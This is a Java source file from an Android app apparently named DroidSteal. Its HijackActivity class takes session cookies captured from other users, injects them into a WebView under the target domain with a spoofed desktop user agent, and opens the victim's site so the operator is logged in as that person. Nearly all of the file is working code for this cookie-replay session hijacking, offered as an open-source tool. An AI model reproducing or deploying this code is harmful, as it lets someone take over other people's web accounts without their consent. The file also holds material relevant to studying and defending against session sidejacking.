/*
 * HijackActivity.java is the WebView Activity setting up the cookies Copyright
 * (C) 2013-2014 Zach Brown <Zbob75x@gmail.com>
 * 
 * This software was supported by the University of Trier
 * 
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 3 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package com.zbrown.droidsteal.activities;

import android.app.ActionBar;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.Window;
import android.webkit.*;
import android.widget.EditText;
import android.widget.Toast;
import com.readystatesoftware.systembartint.SystemBarTintManager;
import com.zbrown.droidsteal.R;
import com.zbrown.droidsteal.auth.Auth;
import com.zbrown.droidsteal.helper.Constants;
import com.zbrown.droidsteal.objects.CookieWrapper;
import org.apache.http.cookie.Cookie;


public class HijackActivity extends Activity implements Constants {
    private WebView webview = null;
    private Auth authToHijack = null;

    private void setupCookies() {
        Log.i(APPLICATION_TAG, "######################## COOKIE SETUP ###############################");
        CookieManager manager = CookieManager.getInstance();
        Log.i(APPLICATION_TAG, "Cookiemanager has cookies: " + (manager.hasCookies() ? "YES" : "NO"));
        if (manager.hasCookies()) {
            manager.removeAllCookie();
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                Log.e(APPLICATION_TAG, "Error with Thread.sleep(3000)", e);
            }
            Log.i(APPLICATION_TAG, "Cookiemanager has still cookies: " + (manager.hasCookies() ? "YES" : "NO"));
        }
        Log.i(APPLICATION_TAG, "######################## COOKIE SETUP START ###############################");
        for (CookieWrapper cookieWrapper : authToHijack.getCookies()) {
            Cookie cookie = cookieWrapper.getCookie();
            String cookieString = cookie.getName() + "=" + cookie.getValue() + "; domain=" + cookie.getDomain() + "; Path="
                    + cookie.getPath();
            Log.i(APPLICATION_TAG, "Setting up cookie: " + cookieString);
            manager.setCookie(cookie.getDomain(), cookieString);
        }
        CookieSyncManager.getInstance().sync();
        Log.i(APPLICATION_TAG, "######################## COOKIE SETUP DONE ###############################");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        //getWindow().requestFeature(Window.FEATURE_PROGRESS);
        getWindow().requestFeature(Window.FEATURE_INDETERMINATE_PROGRESS);

        // Kitkat specific fun
        int currentapiVersion = android.os.Build.VERSION.SDK_INT;
        if (currentapiVersion >= Build.VERSION_CODES.KITKAT) {
            SystemBarTintManager barTint = new SystemBarTintManager(this);
            barTint.setStatusBarTintEnabled(true);

            int actionBarColor = Color.parseColor("#cc0000"); // Same color as our actionbar and theme
            barTint.setStatusBarTintColor(actionBarColor);
        }
        ActionBar actionbar = getActionBar();
        actionbar.setLogo(R.drawable.droidsteal_white);
        actionbar.setDisplayHomeAsUpEnabled(true);

        setContentView(R.layout.webview);
        CookieSyncManager.createInstance(this);

        super.onCreate(savedInstanceState);
    }

    private void setupWebView() {
        webview = (WebView) findViewById(R.id.webviewhijack);
        webview.setWebViewClient(new MyWebViewClient());
        WebSettings webSettings = webview.getSettings();
        webSettings.setUserAgentString("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36");
        webSettings.setJavaScriptEnabled(true); //Blah blah JavaScript is scary blah blah
        webSettings.setAppCacheEnabled(false);
        webSettings.setBuiltInZoomControls(true);
        webSettings.setDisplayZoomControls(false);
        webview.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int progress) {
                getActionBar().setSubtitle(HijackActivity.this.webview.getUrl());
                setProgressBarIndeterminateVisibility(true);

                int fprogress = (Window.PROGRESS_END - Window.PROGRESS_START)
                        / 100 * progress;
                setProgress(fprogress);

                if (progress == 100) {
                    setProgressBarIndeterminateVisibility(false);
                }
            }
        });
    }

    //Menu Items
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        MenuItem menu0 = menu.add(0, 0, 0, getString(R.string.back));
        menu0.setIcon(R.drawable.ic_action_back);
        menu0.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);

        MenuItem menu1 = menu.add(0, 1, 0, getString(R.string.forward));
        menu1.setIcon(R.drawable.ic_action_forward);
        menu1.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);

        MenuItem menu2 = menu.add(0, 2, 0, getString(R.string.reload));
        menu2.setIcon(R.drawable.ic_action_refresh);
        menu2.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);

        menu.add(0, 3, 0, getString(R.string.changeurl));
        menu.add(0, 4, 0, getString(R.string.close));
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case 0:
                if (webview.canGoBack())
                    webview.goBack();
                break;
            case 1:
                if (webview.canGoForward())
                    webview.goForward();
                break;
            case 2:
                webview.reload();
                break;
            case 3:
                selectURL();
                break;
            case 4:
                this.finish();
                break;
        }
        return false;
    }

    private void selectURL() {
        AlertDialog.Builder alert = new AlertDialog.Builder(this);

        alert.setTitle(getString(R.string.changeurl));
        alert.setMessage(getString(R.string.customurl));

        // Set an EditText view to get user input
        final EditText inputName = new EditText(this);
        inputName.setText(HijackActivity.this.webview.getUrl());
        alert.setView(inputName);

        alert.setPositiveButton("Go", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int whichButton) {
                HijackActivity.this.webview.loadUrl(inputName.getText().toString());
            }
        });

        alert.show();
    }

    @Override
    protected void onStart() {
        super.onStart();

        Object o = this.getIntent().getExtras().getSerializable(Constants.BUNDLE_KEY_AUTH);
        authToHijack = (Auth) o;

        if (authToHijack == null) {
            Toast.makeText(this, "There was an error loading this Authentication", Toast.LENGTH_LONG).show();
            finish();
            return;
        }

        boolean mobile = this.getIntent().getExtras().getBoolean("MOBILE");
        String url = mobile ? authToHijack.getMobileUrl() : authToHijack.getUrl();

        setupWebView();
        setupCookies();
        webview.loadUrl(url);
    }

    @Override
    protected void onStop() {
        super.onPause();
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            view.loadUrl(url);
            return true;
        }
    }

}
